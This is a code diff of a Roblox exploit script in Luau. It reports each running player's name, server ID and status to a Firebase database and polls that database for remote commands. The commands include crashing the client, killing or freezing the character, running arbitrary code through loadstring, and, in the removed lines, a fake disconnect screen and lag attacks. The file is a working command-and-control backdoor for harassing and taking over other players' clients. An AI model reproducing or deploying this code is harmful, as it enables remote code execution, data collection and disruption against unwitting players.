@@ -1,41 +1,105 @@
+local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
+local MY_ROLE = "User" 
+local POLL_RATE = 1.5   
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
 
-local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
-local MY_ROLE = "Target" 
+local ALLOWED_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_ "
 
--- === SISTEM PENGAMAN WAKTU ===
-local SCRIPT_START_TIME = os.time() -- Mencatat detik tepat saat player baru join/eksekusi
-local COMMAND_EXPIRY_TIME = 10     -- Perintah yang lebih lama dari 10 detik akan otomatis hangus
-
-local lastCommandId = ""
-local orbitConnection
-local spasmConnection
-local lagConnection
-
-local function stopLoops()
-    if orbitConnection then orbitConnection:Disconnect(); orbitConnection = nil end
-    if spasmConnection then spasmConnection:Disconnect(); spasmConnection = nil end
-    if lagConnection then lagConnection:Disconnect(); lagConnection = nil end
-    pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+local function getShiftValue(display)
+    return (#display % #ALLOWED_CHARS) + 1
 end
 
-local function registerPlayer()
+local function encryptName(name, display)
+    if name == "all" then return "all" end
+    local shift = getShiftValue(display)
+    local first = name:sub(1, 1)
+    local rest = name:sub(2)
+    local encrypted = ""
+    for i = 1, #rest do
+        local ch = rest:sub(i, i)
+        local idx = ALLOWED_CHARS:find(ch, 1, true)
+        if idx then
+            local newIdx = (idx + shift - 1) % #ALLOWED_CHARS + 1
+            encrypted = encrypted .. ALLOWED_CHARS:sub(newIdx, newIdx)
+        else
+            encrypted = encrypted .. ch
+        end
+    end
+    return first .. encrypted
+end
+
+local function decryptName(enc, display)
+    if enc == "all" then return "all" end
+    local shift = getShiftValue(display)
+    local first = enc:sub(1, 1)
+    local rest = enc:sub(2)
+    local decrypted = ""
+    for i = 1, #rest do
+        local ch = rest:sub(i, i)
+        local idx = ALLOWED_CHARS:find(ch, 1, true)
+        if idx then
+            local newIdx = (idx - shift - 1) % #ALLOWED_CHARS + 1
+            decrypted = decrypted .. ALLOWED_CHARS:sub(newIdx, newIdx)
+        else
+            decrypted = decrypted .. ch
+        end
+    end
+    return first .. decrypted
+end
+
+local roleMap = { ["Owner"] = "x8z9A", ["Admin"] = "k2L1p", ["User"] = "m5N0q" }
+local lastCommandId = ""
+
+local function getCharacterElements()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hum = char:WaitForChild("Humanoid", 5)
+    local root = char:WaitForChild("HumanoidRootPart", 5)
+    return char, hum, root
+end
+
+local function getLiveStatus()
+    local _, hum, _ = pcall(getCharacterElements)
+    if hum then
+        local hp = math.floor(hum.Health)
+        local maxHp = math.floor(hum.MaxHealth)
+        local pct = math.floor((hp / maxHp) * 100)
+        return {
+            health = string.format("%d/%d (%d%%)", hp, maxHp, pct),
+            walkspeed = tostring(hum.WalkSpeed),
+            jumppower = tostring(hum.JumpPower),
+            gravity = tostring(workspace.Gravity)
+        }
+    end
+    return { health = "0/0 (0%)", walkspeed = "0", jumppower = "0", gravity = "Normal" }
+end
+
+local function registerToDatabase()
+    local encName = encryptName(LocalPlayer.Name, LocalPlayer.DisplayName)
+    local encRole = roleMap[MY_ROLE] or "m5N0q"
+    local status = getLiveStatus()
+
     local playerData = {
-        name = LocalPlayer.Name,
-        role = MY_ROLE,
+        name = encName,
+        role = encRole,
         gameId = tostring(game.JobId),
-        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+        displayName = LocalPlayer.DisplayName,
+        currentHealth = status.health,
+        currentSpeed = status.walkspeed,
+        currentJump = status.jumppower,
+        currentGrav = status.gravity
     }
+
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if request then
         pcall(function()
             request({
                 Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
                 Method = "PUT",
-                Headers = {["Content-Type"] = "application/json"},
+                Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(playerData)
             })
         end)
@@ -46,145 +110,77 @@ Players.PlayerRemoving:Connect(function(player)
     if player == LocalPlayer then
         local request = (syn and syn.request) or (http and http.request) or http_request or request
         if request then
-            request({Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE"})
+            request({ Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE" })
         end
     end
 end)
 
-local function executeCommand(cmdData)
-    if not cmdData or cmdData.id == lastCommandId then return end
-    
-    -- VALIDASI TIMESTAMP / CEK WAKTU KETAT
-    local cmdTimestamp = tonumber(cmdData.timestamp) or 0
-    local currentTime = os.time()
-    
-    -- 1. Jika perintah dibuat sebelum player ini running skrip, TOLAK.
-    if cmdTimestamp < SCRIPT_START_TIME then return end
-    
-    -- 2. Jika perintah sudah terlalu lama di database (kedaluwarsa), TOLAK.
-    if (currentTime - cmdTimestamp) > COMMAND_EXPIRY_TIME then return end
-    
-    -- Jika lolos sensor waktu, tandai ID dan eksekusi
-    lastCommandId = cmdData.id
-    
-    local command = cmdData.command
-    local target = cmdData.target
-    local extra = cmdData.message
-    
-    if target ~= "all" and target ~= LocalPlayer.Name then return end
-    
-    local char = LocalPlayer.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    
-    stopLoops()
-    
-    if command == "walkspeed" then
-        if hum and extra then
-            local speed = tonumber(extra)
-            if speed then hum.WalkSpeed = speed end
-        end
-        
-    elseif command == "reset" then
-        if hum then hum.Health = 0 end
-        
-    elseif command == "exit" then
-        pcall(function() game:Shutdown() end)
-        
-    elseif command == "crash" then
-        while true do local _ = Instance.new("Part", workspace) end
-        
-    elseif command == "fakedisconnect" then
-        local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-        gui.IgnoreGuiInset = true
-        local bg = Instance.new("Frame", gui)
-        bg.Size = UDim2.new(1, 0, 1, 0)
-        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        bg.BackgroundTransparency = 0.4
-        
-        local p = Instance.new("Frame", bg)
-        p.Size = UDim2.new(0, 380, 0, 220)
-        p.Position = UDim2.new(0.5, -190, 0.5, -110)
-        p.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-        
-        local t = Instance.new("TextLabel", p)
-        t.Size = UDim2.new(1, 0, 0, 40)
-        t.Text = "Disconnected"
-        t.TextColor3 = Color3.fromRGB(255, 255, 255)
-        t.TextSize = 22
-        t.Font = Enum.Font.SourceSansBold
-        t.BackgroundTransparency = 1
-        
-        local r = Instance.new("TextLabel", p)
-        r.Size = UDim2.new(1, -40, 0, 100)
-        r.Position = UDim2.new(0, 20, 0, 50)
-        r.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
-        r.TextColor3 = Color3.fromRGB(200, 200, 200)
-        r.TextSize = 16
-        r.TextWrapped = true
-        r.Font = Enum.Font.SourceSans
-        r.BackgroundTransparency = 1
-        
-    elseif command == "replag" then
-        pcall(function() settings().Network.IncomingReplicationLag = 10 end)
-        
-    elseif command == "fpsdrop" then
-        lagConnection = RunService.Heartbeat:Connect(function()
-            for i = 1, 3000000 do local _ = math.sin(i) * math.cos(i) end
-        end)
-        
-    elseif command == "antiy" then
-        if hum and root then
-            hum.PlatformStand = false
-            for _, part in ipairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then part.CanCollide = true end
+local function executeIncomingCommand(cmd, arg)
+    local char, hum, root = getCharacterElements()
+    if not hum or not root then return end
+
+    if cmd == "reset" then
+        hum.Health = 0
+    elseif cmd == "freeze" then
+        root.Anchored = true
+    elseif cmd == "unfreeze" then
+        root.Anchored = false
+    elseif cmd == "walkspeed" then
+        hum.WalkSpeed = tonumber(arg) or 16
+    elseif cmd == "jumppower" then
+        hum.UseJumpPower = true
+        hum.JumpPower = tonumber(arg) or 50
+    elseif cmd == "gravity" then
+        workspace.Gravity = tonumber(arg) or 196.2
+    elseif cmd == "crash" then
+        task.spawn(function()
+            while true do
+                pcall(function()
+                    local parts = {}
+                    for i = 1, 10000 do table.insert(parts, Instance.new("Part")) end
+                end)
             end
-            hum.WalkSpeed = 16 
-            local bv = root:FindFirstChildOfClass("BodyVelocity") or root:FindFirstChildOfClass("BodyGyro")
-            if bv then bv:Destroy() end
-        end
-        
-    elseif command == "freeze" then
-        if root then root.Anchored = true end
-    elseif command == "unfreeze" then
-        if root then root.Anchored = false end
-    elseif command == "spasm" then
-        if hum and root then
-            hum.PlatformStand = true
-            spasmConnection = RunService.Heartbeat:Connect(function()
-                root.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
-            end)
-        end
-    elseif command == "unspasm" then
-        if hum then hum.PlatformStand = false end
-        if root then root.RotVelocity = Vector3.new(0,0,0) end
-    elseif command == "orbit" then
-        local orbitTarget = Players:FindFirstChild(extra)
-        if root and orbitTarget and orbitTarget.Character and orbitTarget.Character:FindFirstChild("HumanoidRootPart") then
-            local targetRoot = orbitTarget.Character.HumanoidRootPart
-            local angle = 0
-            orbitConnection = RunService.Heartbeat:Connect(function()
-                if targetRoot and root then
-                    angle = angle + 0.1
-                    root.CFrame = targetRoot.CFrame * CFrame.Angles(0, angle, 0) * CFrame.new(0, 0, 10)
-                else
-                    stopLoops()
-                end
-            end)
+        end)
+    elseif cmd == "sound" then
+        local s = Instance.new("Sound", root)
+        s.SoundId = "rbxassetid://" .. (tonumber(arg) or 0)
+        s.Volume = 2
+        s:Play()
+        s.Ended:Connect(function() s:Destroy() end)
+    elseif cmd == "animation" then
+        local anim = Instance.new("Animation")
+        anim.AnimationId = "rbxassetid://" .. (tonumber(arg) or 0)
+        local track = hum:WaitForChild("Animator"):LoadAnimation(anim)
+        track:Play()
+    elseif cmd == "executescript" then
+        if loadstring then
+            pcall(loadstring(arg))
         end
     end
 end
 
-registerPlayer()
 task.spawn(function()
     while true do
         pcall(function()
+            registerToDatabase()
             local response = game:HttpGet(FIREBASE_URL .. "command.json")
             if response and response ~= "null" then
                 local data = HttpService:JSONDecode(response)
-                executeCommand(data)
+                if data and data.id ~= lastCommandId then
+                    lastCommandId = data.id
+                    local targetDecrypted = decryptName(data.target, LocalPlayer.DisplayName)
+                    if data.target == "all" then
+                        if MY_ROLE ~= "Owner" then
+                            executeIncomingCommand(data.command, data.message)
+                        end
+                    elseif targetDecrypted == LocalPlayer.Name then
+                        executeIncomingCommand(data.command, data.message)
+                    end
+                end
             end
         end)
-        task.wait(1.5)
+        task.wait(POLL_RATE)
     end
 end)
+
+registerToDatabase()
